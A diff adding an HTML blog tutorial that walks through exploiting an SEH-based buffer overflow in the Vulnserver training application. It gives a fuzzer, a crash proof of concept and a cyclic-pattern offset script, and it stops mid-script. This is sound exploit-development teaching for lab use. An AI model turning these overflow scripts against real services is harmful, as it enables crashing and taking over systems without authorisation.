@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <title>secoats | Vulnserver Part 2 - GMON</title>
+        <link rel="canonical" href="https://secoats.github.io/posts/vulnserver_2_gmon.html" />
+        <meta name="description" content="Ramblings about InfoSec, Pentesting, CTF and Tools" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <meta name="google-site-verification" content="ec3XZVmgp3ZOsiLB8riLA-9B5kVJVR_71u11vmIMs4w" />
+        <meta property="og:type" content="article" />
+        <meta property="og:locale" content="en_US" />
+        <meta property="og:site_name" content="secoats" />
+        <meta property="og:title" content="Vulnserver Part 2 - GMON" />
+        <meta property="og:url" content="https://secoats.github.io/posts/vulnserver_2_gmon.html" />
+        <meta property="og:image" content="https://secoats.github.io/assets/img/oats_field.jpg">
+        <meta name="author" content="secoats">
+        <meta property="article:author" content="secoats">
+        <link rel="stylesheet" href="/assets/css/main.css" />
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" />
+        <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Fira+Mono" />
+    </head>
+    <body>
+        <div id="main">
+            <div id="header">
+                <div id="masthead" class="wrapper">
+                    <span class="site-title">
+                        <a href="/">secoats</a>
+                    </span>
+                    <span class="main-nav">
+                        <a href="/posts.html">Posts</a>
+<a href="/categories.html#writeup">Writeups</a>
+<a href="/categories.html#tutorial">Tutorials</a>
+                    </span>
+                </div>
+            </div>
+            <main id="content" class="wrapper">
+                <article class="mbox">
+                    <h1 class="article-headline">Vulnserver Part 2 - GMON</h1>
+                    <p class="article-subline">
+                        <span class="article-meta-reading-time"><i class="far fa-clock" aria-hidden="true"></i> 16 minute read</span> - <span class="article-meta-published">September 14, 2021</span>
+                    </p>
+                    <p>In the second part of <a href="/posts/vulnserver_0_overview.html">our Vulnserver series</a> we encounter a SEH-based buffer overflow. SEH stands for <strong>Structured Exception Handling</strong>. The exploitation process is sligthly different, but not really much harder than the vanilla buffer overflow of <a href="/posts/vulnserver_1_trun.html">TRUN</a>. </p>
+<h2 id="fuzzing">Fuzzing<a class="headerlink" href="#fuzzing" title="Permanent link"> </a></h2>
+<p>I just re-used the fuzzer from <a href="/posts/vulnserver_1_trun.html#fuzzing-for-a-crash">TRUN</a>, switching out only the command. The result was pretty much the same.</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># GMON - Step 0 -- Fuzzing for a crash</span>
+<span class="kn">from</span> <span class="nn">boofuzz</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">target_ip</span> <span class="o">=</span> <span class="s2">"10.0.2.74"</span>
+<span class="n">target_port</span> <span class="o">=</span> <span class="mi">9999</span>
+
+<span class="c1"># stop when server is dead</span>
+<span class="k">def</span> <span class="nf">is_alive</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">my_logger</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">banner</span> <span class="o">=</span> <span class="n">target</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">10000</span><span class="p">)</span>
+
+        <span class="c1"># See if we received the standard banner</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">banner</span> <span class="ow">or</span> <span class="n">banner</span> <span class="o">!=</span> <span class="sa">b</span><span class="s1">'Welcome to Vulnerable Server! Enter HELP for help.</span><span class="se">\n</span><span class="s1">'</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s2">"Banner does not match"</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">"Unable to connect. Target is down. Exiting."</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">session</span> <span class="o">=</span> <span class="n">Session</span><span class="p">(</span>
+    <span class="n">sleep_time</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+        <span class="n">target</span><span class="o">=</span><span class="n">Target</span><span class="p">(</span>
+            <span class="n">connection</span><span class="o">=</span><span class="n">SocketConnection</span><span class="p">(</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">target_port</span><span class="p">,</span> <span class="n">proto</span><span class="o">=</span><span class="s1">'tcp'</span><span class="p">)</span>
+        <span class="p">),</span>
+    <span class="p">)</span>
+
+    <span class="n">s_initialize</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s2">"Request"</span><span class="p">)</span>
+    <span class="k">with</span> <span class="n">s_block</span><span class="p">(</span><span class="s2">"Host-Line"</span><span class="p">):</span>
+        <span class="n">s_static</span><span class="p">(</span><span class="s2">"GMON"</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="s1">'command name'</span><span class="p">)</span>
+        <span class="n">s_delim</span><span class="p">(</span><span class="s2">" "</span><span class="p">)</span>
+        <span class="n">s_string</span><span class="p">(</span><span class="s2">"FUZZ"</span><span class="p">,</span>  <span class="n">name</span><span class="o">=</span><span class="s1">'gmon variable content'</span><span class="p">)</span>
+        <span class="n">s_delim</span><span class="p">(</span><span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">)</span>
+
+    <span class="c1"># the callback function gets executed after each test</span>
+    <span class="n">session</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">s_get</span><span class="p">(</span><span class="s2">"Request"</span><span class="p">),</span> <span class="n">callback</span><span class="o">=</span><span class="n">is_alive</span><span class="p">)</span> 
+    <span class="n">session</span><span class="o">.</span><span class="n">fuzz</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div></div></div>
+<p>Once again the pattern that causes a crash appears to be: <code>GMON /././.</code> with the <code>/.</code> being repeated many times.</p>
+<h2 id="proof-of-concept">Proof of Concept<a class="headerlink" href="#proof-of-concept" title="Permanent link"> </a></h2>
+<p>Therefore the PoC is pretty much identical to the TRUN one as well:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># GMON - SEH based buffer overflow</span>
+<span class="c1"># Step 1 - cause a crash / proof of concept</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+
+<span class="n">size</span> <span class="o">=</span> <span class="mi">4096</span>
+<span class="n">target_ip</span> <span class="o">=</span> <span class="s2">"10.0.2.74"</span>
+<span class="n">target_port</span> <span class="o">=</span> <span class="mi">9999</span>
+
+<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"GMON /."</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"A"</span> <span class="o">*</span> <span class="n">size</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span> <span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">target_port</span><span class="p">))</span>
+
+<span class="c1"># receive banner</span>
+<span class="n">banner</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
+
+<span class="c1"># send evil buffer</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Sending evil buffer with </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="si">}</span><span class="s2"> bytes and payload length </span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s2">..."</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+
+<span class="c1"># should get stuck here</span>
+<span class="c1"># receive response</span>
+<span class="n">a</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Done!"</span><span class="p">)</span>
+</code></pre></div></div></div>
+<p>This manages to consistently crash the server in Immunity.</p>
+<h2 id="not-quite-the-same">Not Quite the Same<a class="headerlink" href="#not-quite-the-same" title="Permanent link"> </a></h2>
+<p>One big difference to what we experienced with TRUN will be that after the crash the EIP will not be full of A's and the ESP will not point at a stack segment that we control directly:</p>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="Fuzzer crashes the server" src="/assets/img/vulnserver_gmon_10.png"/></div></div></p>
+<p>The program has been stopped because of an exception: <code>Access Violation when writing to [00F60000]...</code></p>
+<p>What we see is the following, located above our buffer content:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>__stack__
+    <span class="p">|</span> 00F5F1CC   <span class="m">00000000</span>  ....
+ESP &gt; 00F5F1D0   <span class="m">00401848</span>  H@.  vulnserv.00401848
+    <span class="p">|</span> 00F5F1D4   <span class="m">00401826</span>  <span class="p">&amp;</span>@.  RETURN to vulnserv.00401826 from &lt;JMP.<span class="p">&amp;</span>msvcrt.strcpy&gt;
+    <span class="p">|</span> 00F5F1D8   00F5F1E8  èñõ.  ASCII <span class="s2">"GMON /.AAAAA"</span>...
+    <span class="p">|</span> 00F5F1DC   <span class="m">00763520</span>   5v.  ASCII <span class="s2">"GMON /.AAAAA"</span>...
+    <span class="p">|</span> 00F5F1E0   <span class="m">00000000</span>  ....
+</code></pre></div></div></div>
+<p>With the ESP pointing at <code>00F5F1D0</code>, outside of our controlled stack space full of AA's.</p>
+<p>If we scroll down to the bottom of the buffer content, then we find this:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>__stack__
+00F5FFC8   <span class="m">41414141</span>  AAAA
+00F5FFCC   <span class="m">41414141</span>  AAAA  Pointer to next SEH record
+00F5FFD0   <span class="m">41414141</span>  AAAA  SE handler
+00F5FFD4   <span class="m">41414141</span>  AAAA
+00F5FFD8   <span class="m">41414141</span>  AAAA
+00F5FFDC   <span class="m">41414141</span>  AAAA
+00F5FFE0   <span class="m">41414141</span>  AAAA
+</code></pre></div></div></div>
+<p>I've already spoilered you and told you this is a SEH-based buffer overflow, but this would be a dead giveaway.</p>
+<p>Press <code>&lt;Alt&gt;</code> + <code>&lt;S&gt;</code> in order to open the SEH chain window:</p>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="SEH Chain" src="/assets/img/vulnserver_gmon_11_seh_chain.png"/></div></div></p>
+<p>This reflects what we see on the stack.</p>
+<p>A SEH record always consist of two 4 Byte (32 bit) addresses stored on the stack:</p>
+<ul>
+<li>NSEH - pointer to the next SEH record</li>
+<li>SEH - pointer to a handler procedure</li>
+</ul>
+<p>If you have done some programming before, then you might recognize this as a <a href="https://en.wikipedia.org/wiki/Linked_list">Linked List</a> with each SEH record being a list node.</p>
+<p>The way this is supposed to work is that when an Exception occurs, each of these SEH records are visited in order. </p>
+<p>The associated SEH procedure is run and then the program moves on to the next SEH record, executes its procedure, etc. etc. until it finally reaches the last SEH record. This last SEH record will have an NSEH pointer set to <code>FFFFFFFF</code>.</p>
+<p>Now what we see in Immunity is that we evidentally broke the first SEH record in the chain. We overwrote both NSEH and SEH pointers.</p>
+<p>Immunity conveniently stopped the execution when it detected an Exception, this prevented the corrupt SEH pointer from being jumped to. You can let Immunity continue by pressing <code>&lt;Shift&gt;</code> + <code>&lt;F9&gt;</code>.</p>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="SEH Chain was followed" src="/assets/img/vulnserver_gmon_12_seh_followed.png"/></div></div></p>
+<p>What we see now is quite similar to the TRUN crash. The program tried to jump to <code>41414141</code> (hex for AAAA) which then caused another Exception since that is a bogus address.</p>
+<p>This means we can exploit the program in a smilar fashion. First cause an exception and then use the overwritten SEH record in order to jump to some instructions of our choosing with a static address. Those instructions then get executed and hopefully the program jumps back to the buffer that we control.</p>
+<p>The only problem is that, as mentioned above, the ESP (Stack Pointer) has been moved outside of our controlled stack space. So using a simple <code>JMP ESP</code> like we did in TRUN won't work here.</p>
+<h2 id="controlling-nseh-and-seh">Controlling NSEH and SEH<a class="headerlink" href="#controlling-nseh-and-seh" title="Permanent link"> </a></h2>
+<p>This part is quite familar. We have to figure out the offset between the start of our buffer and the overwritten SEH record.</p>
+<p>We can repeat what we did before in TRUN. You know the drill.</p>
+<p>Create a unique byte pattern with the length of our AAAA buffer:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>msf-pattern_create -l <span class="m">4096</span>
+</code></pre></div></div></div>
+<p>Plug it into our PoC:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># GMON - SEH based buffer overflow</span>
+<span class="c1"># Step 2 - discover nseh offset</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+
+<span class="n">size</span> <span class="o">=</span> <span class="mi">4096</span>
+<span class="n">target_ip</span> <span class="o">=</span> <span class="s2">"10.0.2.74"</span>
+<span class="n">target_port</span> <span class="o">=</span> <span class="mi">9999</span>
+<span class="n">line_ending</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+
+<span class="c1"># msf-pattern_create -l 4096</span>
+<span class="n">pattern</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"d3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"n3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"x3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"h3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2B"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"r3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2C"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"b3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2C"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"l3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2C"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"v3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"f3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2D"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"p3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2D"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"z3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2E"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"j3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2E"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"t3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2F"</span>
+<span class="n">pattern</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"d3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4F"</span>
+
+<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"GMON /."</span>
+<span class="c1">#buf += b"A" * size</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">pattern</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">line_ending</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span> <span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">target_port</span><span class="p">))</span>
+
+<span class="c1"># receive banner</span>
+<span class="n">banner</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
+
+<span class="c1"># send evil buffer</span>
